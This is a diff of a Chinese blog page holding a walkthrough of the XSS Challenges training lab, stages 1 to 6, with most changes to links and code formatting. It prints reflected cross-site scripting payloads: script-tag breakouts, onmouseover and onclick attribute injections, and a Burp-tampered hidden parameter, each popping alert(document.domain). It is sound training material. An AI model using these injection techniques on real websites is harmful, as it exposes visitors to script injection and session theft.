@@ -21,12 +21,12 @@
   <title>XSS-and-Security-Labs：XSS Challenges - Rabbit's Blog</title>
 
   
-    <meta name="description" content="XSS 挑战 （由 yamagata21） - 阶段 #1 (int21h.jp) 题目要求注入 JavaScript 命令： alert(document.domain); Stage #1 输入321来定位代码的位置，发现是处于&lt;b&gt;&lt;&#x2F;b&gt;标签之内，没有任何过滤 &#x2F;&#x2F; 第一种方法是闭合 b 标签，插入 Script 标签 &quot;&lt;&#x2F;b&gt; &lt;sc">
+    <meta name="description" content="XSS 挑战 （由 yamagata21） - 阶段 #1 (int21h.jp) 题目要求注入 JavaScript 命令： alert(document.domain); Stage #1 输入321来定位代码的位置，发现是处于&lt;b&gt;&lt;&#x2F;b&gt;标签之内，没有任何过滤 12345&#x2F;&#x2F; 第一种方法是闭合 b 标签，插入 Script 标签&quot;&lt;&#x2F;b&gt; &amp;l">
 <meta property="og:type" content="website">
 <meta property="og:title" content="XSS Challenges">
-<meta property="og:url" content="https://zero-yi7.github.io/wiki/XSS-and-Security-Labs/XSS%20Challenges.html">
+<meta property="og:url" content="https://askrabbit.cn/wiki/XSS-and-Security-Labs/XSS%20Challenges">
 <meta property="og:site_name" content="Rabbit&#39;s Blog">
-<meta property="og:description" content="XSS 挑战 （由 yamagata21） - 阶段 #1 (int21h.jp) 题目要求注入 JavaScript 命令： alert(document.domain); Stage #1 输入321来定位代码的位置，发现是处于&lt;b&gt;&lt;&#x2F;b&gt;标签之内，没有任何过滤 &#x2F;&#x2F; 第一种方法是闭合 b 标签，插入 Script 标签 &quot;&lt;&#x2F;b&gt; &lt;sc">
+<meta property="og:description" content="XSS 挑战 （由 yamagata21） - 阶段 #1 (int21h.jp) 题目要求注入 JavaScript 命令： alert(document.domain); Stage #1 输入321来定位代码的位置，发现是处于&lt;b&gt;&lt;&#x2F;b&gt;标签之内，没有任何过滤 12345&#x2F;&#x2F; 第一种方法是闭合 b 标签，插入 Script 标签&quot;&lt;&#x2F;b&gt; &amp;l">
 <meta property="og:locale" content="zh_CN">
 <meta property="og:image" content="https://favorably-7690.oss-cn-beijing.aliyuncs.com/XSS%20Challenges/202410070258263.png">
 <meta property="og:image" content="https://favorably-7690.oss-cn-beijing.aliyuncs.com/XSS%20Challenges/202410070258488.png">
@@ -92,21 +92,21 @@
 <div class="l_body s:aa content tech" id="start" layout="page" ><aside class="l_left"><div class="leftbar-container">
 
 
-<header class="header"><div class="logo-wrap"><div class="icon"><img no-lazy class="icon" src="/wiki/XSS-and-Security-Labs/logo-htb.svg" onerror="javascript:this.classList.add('error');this.src='https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/image/2659360.svg';"></div><a class="title" href="/wiki/XSS-and-Security-Labs/index.html"><div class="main" ff="title">XSS-and-Security-Labs</div></a></div></header>
+<header class="header"><div class="logo-wrap"><div class="icon"><img no-lazy class="icon" src="/wiki/XSS-and-Security-Labs/logo-htb.svg" onerror="javascript:this.classList.add('error');this.src='https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/image/2659360.svg';"></div><a class="title" href="/wiki/XSS-and-Security-Labs/"><div class="main" ff="title">XSS-and-Security-Labs</div></a></div></header>
 
 <div class="nav-area">
 <div class="search-wrapper" id="search-wrapper"><form class="search-form"><a class="search-button" onclick="document.getElementById(&quot;search-input&quot;).focus();"><svg t="1705074644177" viewBox="0 0 1025 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" p-id="1560" width="200" height="200"><path d="M1008.839137 935.96571L792.364903 719.491476a56.783488 56.783488 0 0 0-80.152866 0 358.53545 358.53545 0 1 1 100.857314-335.166073 362.840335 362.840335 0 0 1-3.689902 170.145468 51.248635 51.248635 0 1 0 99.217358 26.444296 462.057693 462.057693 0 1 0-158.255785 242.303546l185.930047 185.725053a51.248635 51.248635 0 0 0 72.568068 0 51.248635 51.248635 0 0 0 0-72.978056z" p-id="1561"></path><path d="M616.479587 615.969233a50.428657 50.428657 0 0 0-61.498362-5.534852 174.655348 174.655348 0 0 1-177.525271 3.484907 49.403684 49.403684 0 0 0-58.833433 6.76482l-3.074918 2.869923a49.403684 49.403684 0 0 0 8.609771 78.10292 277.767601 277.767601 0 0 0 286.992355-5.739847 49.403684 49.403684 0 0 0 8.404776-76.667958z" p-id="1562"></path></svg></a><input type="text" class="search-input" id="search-input" data-filter="/wiki/XSS-and-Security-Labs/" placeholder="在文档中搜索..."></form><div id="search-result"></div><div class="search-no-result">没有找到内容！</div></div>
 
 
-<nav class="menu dis-select"><a class="nav-item" title="主页" href="/"><span>主页</span></a><a class="nav-item" title="探索" href="/wiki/"><span>探索</span></a></nav>
+<nav class="menu dis-select"><a class="nav-item" title="主页" href="/"><span>主页</span></a><a class="nav-item active" title="探索" href="/wiki/"><span>探索</span></a></nav>
 </div>
 <div class="widgets">
 
-<widget class="widget-wrapper post-list"><div class="widget-header dis-select"><span class="name">Start</span></div><div class="widget-body fs14"><a class="link" href="/wiki/XSS-and-Security-Labs/index.html#start"><span class="toc-text">Web 安全靶场与 XSS 挑战文档</span></a></div><div class="widget-header dis-select"><span class="name">Hack The Box</span></div><div class="widget-body fs14"><a class="link" href="/wiki/XSS-and-Security-Labs/index%20-%202.html"><span class="toc-text">Hack The Box (HTB)</span></a><a class="link" href="/wiki/XSS-and-Security-Labs/Precious.html"><span class="toc-text">Precious — Hack The Box Machine</span></a><a class="link" href="/wiki/XSS-and-Security-Labs/MonitorsTwo.html"><span class="toc-text">MonitorsTwo — Hack The Box Machine</span></a><a class="link" href="/wiki/XSS-and-Security-Labs/Inject.html"><span class="toc-text">Inject — Hack The Box Machine</span></a><a class="link" href="/wiki/XSS-and-Security-Labs/Busqueda.html"><span class="toc-text">Busqueda — Hack The Box Machine</span></a></div><div class="widget-header dis-select"><span class="name">XSS Games</span></div><div class="widget-body fs14"><a class="link" href="/wiki/XSS-and-Security-Labs/Google%20XSS%20Game.html"><span class="toc-text">Google XSS Game</span></a><a class="link active" href="/wiki/XSS-and-Security-Labs/XSS%20Challenges.html"><span class="toc-text">XSS Challenges</span><svg class="active-icon" xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" d="M21 11.098v4.993c0 3.096 0 4.645-.734 5.321c-.35.323-.792.526-1.263.58c-.987.113-2.14-.907-4.445-2.946c-1.02-.901-1.529-1.352-2.118-1.47a2.225 2.225 0 0 0-.88 0c-.59.118-1.099.569-2.118 1.47c-2.305 2.039-3.458 3.059-4.445 2.945a2.238 2.238 0 0 1-1.263-.579C3 20.736 3 19.188 3 16.091v-4.994C3 6.81 3 4.666 4.318 3.333C5.636 2 7.758 2 12 2c4.243 0 6.364 0 7.682 1.332C21 4.665 21 6.81 21 11.098" opacity=".5"/><path fill="currentColor" d="M9 5.25a.75.75 0 0 0 0 1.5h6a.75.75 0 0 0 0-1.5z"/></svg></a><a class="link" href="/wiki/XSS-and-Security-Labs/xss-labs.html"><span class="toc-text">xss-labs</span></a></div><div class="widget-header dis-select"><span class="name">File upload Games</span></div><div class="widget-body fs14"><a class="link" href="/wiki/XSS-and-Security-Labs/Upload-labs.html"><span class="toc-text">Upload-labs 靶场</span></a></div><div class="widget-header dis-select"><span class="name">SQL injection</span></div><div class="widget-body fs14"><a class="link" href="/wiki/XSS-and-Security-Labs/sqli-labs.html"><span class="toc-text">sqli-labs 靶场（手工注入）</span></a><a class="link" href="/wiki/XSS-and-Security-Labs/sqli-labs-SQLMap.html"><span class="toc-text">sqli-labs 靶场使用 SQLMap 注入（1-25 关）</span></a></div><div class="widget-header dis-select"><span class="name">Comprehensive shooting range</span></div><div class="widget-body fs14"><a class="link" href="/wiki/XSS-and-Security-Labs/DVWA-master.html"><span class="toc-text">DVWA 靶场</span></a></div><div class="widget-header dis-select"><span class="name">Reproducible vulnerability</span></div><div class="widget-body fs14"><a class="link" href="/wiki/XSS-and-Security-Labs/Reproducible%20vulnerability.html"><span class="toc-text">已知漏洞复现与验证</span></a><a class="link" href="/wiki/XSS-and-Security-Labs/CyberPanel%20has%20a%20remote%20code%20execution%20(RCE)%20vulnerability.html"><span class="toc-text">【漏洞复现 - 241029】CyberPanel 存在远程代码执行（RCE）漏洞</span></a></div></widget>
+<widget class="widget-wrapper post-list"><div class="widget-header dis-select"><span class="name">Start</span></div><div class="widget-body fs14"><a class="link" href="/wiki/XSS-and-Security-Labs/#start"><span class="toc-text">Web 安全靶场与 XSS 挑战文档</span></a></div><div class="widget-header dis-select"><span class="name">Hack The Box</span></div><div class="widget-body fs14"><a class="link" href="/wiki/XSS-and-Security-Labs/index%20-%202"><span class="toc-text">Hack The Box (HTB)</span></a><a class="link" href="/wiki/XSS-and-Security-Labs/Precious"><span class="toc-text">Precious — Hack The Box Machine</span></a><a class="link" href="/wiki/XSS-and-Security-Labs/MonitorsTwo"><span class="toc-text">MonitorsTwo — Hack The Box Machine</span></a><a class="link" href="/wiki/XSS-and-Security-Labs/Inject"><span class="toc-text">Inject — Hack The Box Machine</span></a><a class="link" href="/wiki/XSS-and-Security-Labs/Busqueda"><span class="toc-text">Busqueda — Hack The Box Machine</span></a></div><div class="widget-header dis-select"><span class="name">XSS Games</span></div><div class="widget-body fs14"><a class="link" href="/wiki/XSS-and-Security-Labs/Google%20XSS%20Game"><span class="toc-text">Google XSS Game</span></a><a class="link active" href="/wiki/XSS-and-Security-Labs/XSS%20Challenges"><span class="toc-text">XSS Challenges</span><svg class="active-icon" xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" d="M21 11.098v4.993c0 3.096 0 4.645-.734 5.321c-.35.323-.792.526-1.263.58c-.987.113-2.14-.907-4.445-2.946c-1.02-.901-1.529-1.352-2.118-1.47a2.225 2.225 0 0 0-.88 0c-.59.118-1.099.569-2.118 1.47c-2.305 2.039-3.458 3.059-4.445 2.945a2.238 2.238 0 0 1-1.263-.579C3 20.736 3 19.188 3 16.091v-4.994C3 6.81 3 4.666 4.318 3.333C5.636 2 7.758 2 12 2c4.243 0 6.364 0 7.682 1.332C21 4.665 21 6.81 21 11.098" opacity=".5"/><path fill="currentColor" d="M9 5.25a.75.75 0 0 0 0 1.5h6a.75.75 0 0 0 0-1.5z"/></svg></a><a class="link" href="/wiki/XSS-and-Security-Labs/xss-labs"><span class="toc-text">xss-labs</span></a></div><div class="widget-header dis-select"><span class="name">File upload Games</span></div><div class="widget-body fs14"><a class="link" href="/wiki/XSS-and-Security-Labs/Upload-labs"><span class="toc-text">Upload-labs 靶场</span></a></div><div class="widget-header dis-select"><span class="name">SQL injection</span></div><div class="widget-body fs14"><a class="link" href="/wiki/XSS-and-Security-Labs/sqli-labs"><span class="toc-text">sqli-labs 靶场（手工注入）</span></a><a class="link" href="/wiki/XSS-and-Security-Labs/sqli-labs-SQLMap"><span class="toc-text">sqli-labs 靶场使用 SQLMap 注入（1-25 关）</span></a></div><div class="widget-header dis-select"><span class="name">Comprehensive shooting range</span></div><div class="widget-body fs14"><a class="link" href="/wiki/XSS-and-Security-Labs/DVWA-master"><span class="toc-text">DVWA 靶场</span></a></div><div class="widget-header dis-select"><span class="name">Reproducible vulnerability</span></div><div class="widget-body fs14"><a class="link" href="/wiki/XSS-and-Security-Labs/Reproducible%20vulnerability"><span class="toc-text">已知漏洞复现与验证</span></a><a class="link" href="/wiki/XSS-and-Security-Labs/CyberPanel%20has%20a%20remote%20code%20execution%20(RCE)%20vulnerability"><span class="toc-text">【漏洞复现 - 241029】CyberPanel 存在远程代码执行（RCE）漏洞</span></a></div></widget>
 
 
 </div>
-<footer class="footer dis-select"><div class="social-wrap"><a class="social" href="https://github.com/Zero-Yi7" target="_blank" rel="external nofollow noopener noreferrer"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/social/08a41b181ce68.svg"/></a></div></footer>
+<footer class="footer dis-select"><div class="social-wrap"><a class="social" href="https://github.com/Zero-Yi7" target="_blank" rel="external nofollow noopener noreferrer"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/social/08a41b181ce68.svg"/></a><a class="social" onclick="switchTheme()"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 1024 1024"><path fill="currentColor" fill-rule="evenodd" d="M582.4 326.4c-140.8 0-256 115.2-256 256s115.2 256 256 256 256-115.2 256-256-115.2-256-256-256z m0 448c-70.4 0-131.2-36.8-164.8-92.8 12.8 3.2 27.2 4.8 40 4.8 121.6 0 219.2-99.2 219.2-219.2 0-17.6-1.6-35.2-6.4-52.8 60.8 32 102.4 96 102.4 169.6 1.6 104-84.8 190.4-190.4 190.4zM582.4 262.4c17.6 0 32-14.4 32-32v-128c0-17.6-14.4-32-32-32s-32 14.4-32 32v128c0 17.6 14.4 32 32 32zM262.4 582.4c0-17.6-14.4-32-32-32h-128c-17.6 0-32 14.4-32 32s14.4 32 32 32h128c17.6 0 32-14.4 32-32zM310.4 356.8c6.4 6.4 14.4 9.6 22.4 9.6 8 0 16-3.2 22.4-9.6 12.8-12.8 12.8-32 0-44.8l-91.2-91.2c-12.8-12.8-32-12.8-44.8 0-12.8 12.8-12.8 32 0 44.8l91.2 91.2zM944 220.8c-12.8-12.8-32-12.8-44.8 0l-91.2 91.2c-12.8 12.8-12.8 32 0 44.8 6.4 6.4 14.4 9.6 22.4 9.6 8 0 16-3.2 22.4-9.6l91.2-91.2c12.8-12.8 12.8-33.6 0-44.8zM310.4 808l-91.2 91.2c-12.8 12.8-12.8 32 0 44.8 6.4 6.4 14.4 9.6 22.4 9.6 8 0 16-3.2 22.4-9.6l91.2-91.2c12.8-12.8 12.8-32 0-44.8-11.2-11.2-32-11.2-44.8 0z"></path></svg></a></div></footer>
 </div></aside><div class="l_main" id="main">
 
 
@@ -116,7 +116,7 @@
 <div class="article banner top">
   <div class="content">
     <div class="top bread-nav footnote"><div class="left"><div class="flex-row" id="breadcrumb"><a class="cap breadcrumb" href="/">主页</a>
-<span class="sep"></span><a class="cap breadcrumb" id="menu" href="/wiki">文档</a><span class="sep"></span><a class="cap breadcrumb" id="proj" href="/wiki/XSS-and-Security-Labs/index.html">XSS-and-Security-Labs</a></div>
+<span class="sep"></span><a class="cap breadcrumb" id="menu" href="/wiki">文档</a><span class="sep"></span><a class="cap breadcrumb" id="proj" href="/wiki/XSS-and-Security-Labs/">XSS-and-Security-Labs</a></div>
 <div class="flex-row" id="post-meta"><span class="text created">更新于：<time datetime="2023-02-13T12:46:25.000Z">2023-02-13</time></span></div></div></div>
     
     <div class="bottom only-title">
@@ -132,12 +132,7 @@
 <p>题目要求注入 JavaScript 命令： <code>alert(document.domain);</code></p>
 <h2 id="Stage-1">Stage #1</h2>
 <p>输入<code>321</code>来定位代码的位置，发现是处于<code>&lt;b&gt;&lt;/b&gt;</code>标签之内，没有任何过滤</p>
-<pre><code class="language-js">// 第一种方法是闭合 b 标签，插入 Script 标签
-&quot;&lt;/b&gt; &lt;script&gt;alert(document.domain)&lt;/script&gt;//
-
-// 第二种方法是直接在 b 标签内部构造 XSS
-&lt;script&gt;alert(document.domain)&lt;/script&gt;
-</code></pre>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-comment">// 第一种方法是闭合 b 标签，插入 Script 标签</span><br><span class="hljs-string">&quot;&lt;/b&gt; &lt;script&gt;alert(document.domain)&lt;/script&gt;//</span><br><span class="hljs-string"></span><br><span class="hljs-string">// 第二种方法是直接在 b 标签内部构造 XSS</span><br><span class="hljs-string">&lt;script&gt;alert(document.domain)&lt;/script&gt;</span><br></code></pre></td></tr></table></figure>
 <p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://favorably-7690.oss-cn-beijing.aliyuncs.com/XSS%20Challenges/202410070258263.png" alt="image-20230203115847688"></p>
 <center style="color:#C0C0C0;text-decoration:underline">定位位置</center>
 <p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://favorably-7690.oss-cn-beijing.aliyuncs.com/XSS%20Challenges/202410070258488.png" alt="image-20230203115011361"></p>
@@ -146,13 +141,7 @@
 <center style="color:#C0C0C0;text-decoration:underline">直接在 b 标签内部构造 XSS</center>
 <h2 id="Stage-2">Stage #2</h2>
 <p>输入<code>321</code>来定位代码的位置，发现注入点在<code>input</code>标签的<code>value</code>属性里面</p>
-<pre><code class="language-js">// 第一种方法是闭合 input 标签，插入 Script 标签
-&quot;&gt; &lt;script&gt;alert(document.domain)&lt;/script&gt;//
-
-// 第二种方法是在 input 标签中插入属性
-// onmouseover 事件 --&gt; 鼠标指针移动到图片后执行Javascript代码
-123&quot; onmouseover=alert(document.domain)&gt;//
-</code></pre>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-comment">// 第一种方法是闭合 input 标签，插入 Script 标签</span><br><span class="hljs-string">&quot;&gt; &lt;script&gt;alert(document.domain)&lt;/script&gt;//</span><br><span class="hljs-string"></span><br><span class="hljs-string">// 第二种方法是在 input 标签中插入属性</span><br><span class="hljs-string">// onmouseover 事件 --&gt; 鼠标指针移动到图片后执行Javascript代码</span><br><span class="hljs-string">123&quot;</span> onmouseover=<span class="hljs-title function_">alert</span>(<span class="hljs-variable language_">document</span>.<span class="hljs-property">domain</span>)&gt;<span class="hljs-comment">//</span><br></code></pre></td></tr></table></figure>
 <p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://favorably-7690.oss-cn-beijing.aliyuncs.com/XSS%20Challenges/202410070258502.png" alt="image-20230203140859327"></p>
 <center style="color:#C0C0C0;text-decoration:underline">定位位置</center>
 <p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://favorably-7690.oss-cn-beijing.aliyuncs.com/XSS%20Challenges/202410070258427.png" alt="image-20230203142145706"></p>
@@ -171,9 +160,7 @@
 </ul>
 <p>通过查看源代码发现有两个参数，P1 是文本输入，P2 是下拉列表，因为 P1 有过滤，所以对 P2 进行注入</p>
 <p>用 burp 截取数据包，篡改 P2 的值，Forward 放包之后会发现弹出</p>
-<pre><code class="language-js">// burp 中对 P2 参数进行注入， 
-p1=123&amp;p2=&lt;script&gt;alert(document.domain)&lt;/script&gt;
-</code></pre>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-comment">// burp 中对 P2 参数进行注入， </span><br>p1=<span class="hljs-number">123</span>&amp;p2=<span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"><span class="hljs-title function_">alert</span>(<span class="hljs-variable language_">document</span>.<span class="hljs-property">domain</span>)</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span><br></code></pre></td></tr></table></figure>
 <p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://favorably-7690.oss-cn-beijing.aliyuncs.com/XSS%20Challenges/202410070258265.png" alt="image-20230203144012967"></p>
 <center style="color:#C0C0C0;text-decoration:underline">定位位置</center>
 <p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://favorably-7690.oss-cn-beijing.aliyuncs.com/XSS%20Challenges/202410070258651.png" alt="image-20230203152822720"></p>
@@ -182,9 +169,7 @@ p1=123&amp;p2=&lt;script&gt;alert(document.domain)&lt;/script&gt;
 <h2 id="Stage-4">Stage #4</h2>
 <p>输入<code>321</code>来定位代码的位置，发现注入点还是在<code>b</code>标签，但是用 burp 抓包后发现了三个参数，P1、P2、P3</p>
 <p>从源代码中搜索 P3 的值 hackme，发现是在一个 input 标签的 value 属性中，且<code>type=&quot;hidden&quot;</code>，这说明该 input 元素在网页页面是不可见的，换言之网页上面不显示输入框，做了隐藏处理。</p>
-<pre><code class="language-js">// 用 burp 截取数据包，然后对 P3 参数进行篡改，用 &quot;&gt; 闭合 input 标签，插入 Script 标签
-&quot;&gt;&lt;script&gt;alert(document.domain)&lt;/script&gt;
-</code></pre>
+ <figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-comment">// 用 burp 截取数据包，然后对 P3 参数进行篡改，用 &quot;&gt; 闭合 input 标签，插入 Script 标签</span><br><span class="hljs-string">&quot;&gt;&lt;script&gt;alert(document.domain)&lt;/script&gt;</span><br></code></pre></td></tr></table></figure>
 <p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://favorably-7690.oss-cn-beijing.aliyuncs.com/XSS%20Challenges/202410070258482.png" alt="image-20230203163943907"></p>
 <center style="color:#C0C0C0;text-decoration:underline">定位位置</center>
 <p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://favorably-7690.oss-cn-beijing.aliyuncs.com/XSS%20Challenges/202410070259031.png" alt="image-20230203164750251"></p>
@@ -201,13 +186,7 @@ p1=123&amp;p2=&lt;script&gt;alert(document.domain)&lt;/script&gt;
 <p>像是这中前端的设置是可以在源代码中进行修改，进而绕过限制</p>
 </blockquote>
 <p>然后把<code>maxlength</code>的值设置为<code>100</code>，接着就是 Stage #2 的步骤</p>
-<pre><code class="language-js">// 第一种方法是闭合 input 标签，插入 Script 标签
-&quot;&gt; &lt;script&gt;alert(document.domain)&lt;/script&gt;//
-
-// 第二种方法是在 input 标签中插入属性
-// onmouseover 事件 --&gt; 鼠标指针移动到图片后执行Javascript代码
-123&quot; onmouseover=alert(document.domain)&gt;//
-</code></pre>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-comment">// 第一种方法是闭合 input 标签，插入 Script 标签</span><br><span class="hljs-string">&quot;&gt; &lt;script&gt;alert(document.domain)&lt;/script&gt;//</span><br><span class="hljs-string"></span><br><span class="hljs-string">// 第二种方法是在 input 标签中插入属性</span><br><span class="hljs-string">// onmouseover 事件 --&gt; 鼠标指针移动到图片后执行Javascript代码</span><br><span class="hljs-string">123&quot;</span> onmouseover=<span class="hljs-title function_">alert</span>(<span class="hljs-variable language_">document</span>.<span class="hljs-property">domain</span>)&gt;<span class="hljs-comment">//</span><br></code></pre></td></tr></table></figure>
 <p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://favorably-7690.oss-cn-beijing.aliyuncs.com/XSS%20Challenges/202410070259320.png" alt="image-20230203170633948"></p>
 <center style="color:#C0C0C0;text-decoration:underline">定位位置</center>
 <p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://favorably-7690.oss-cn-beijing.aliyuncs.com/XSS%20Challenges/202410070259756.png" alt="image-20230203171700148"></p>
@@ -221,12 +200,7 @@ p1=123&amp;p2=&lt;script&gt;alert(document.domain)&lt;/script&gt;
 <li><code>&gt;</code> --&gt; <code>&amp;gt;</code></li>
 </ul>
 <p><a target="_blank" rel="noopener" href="https://www.runoob.com/tags/ref-eventattributes.html">HTML 事件 | 菜鸟教程 (runoob.com)</a></p>
-<pre><code class="language-js">// 需要点击搜索框触发，
-&quot; onclick=alert(document.domain)	
-
-// 需要移动到搜索框触发
-&quot; onmouseover=alert(document.domain)
-</code></pre>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-comment">// 需要点击搜索框触发，</span><br><span class="hljs-string">&quot; onclick=alert(document.domain)    </span><br><span class="hljs-string"></span><br><span class="hljs-string">// 需要移动到搜索框触发</span><br><span class="hljs-string">&quot;</span> onmouseover=<span class="hljs-title function_">alert</span>(<span class="hljs-variable language_">document</span>.<span class="hljs-property">domain</span>)<br></code></pre></td></tr></table></figure>
 <p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://favorably-7690.oss-cn-beijing.aliyuncs.com/XSS%20Challenges/202410070259318.png" alt="image-20230203202220104"></p>
 <center style="color:#C0C0C0;text-decoration:underline">查看过滤情况</center>
 <p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://favorably-7690.oss-cn-beijing.aliyuncs.com/XSS%20Challenges/202410070259397.png" alt="image-20230203203046957"></p>
@@ -234,22 +208,14 @@ p1=123&amp;p2=&lt;script&gt;alert(document.domain)&lt;/script&gt;
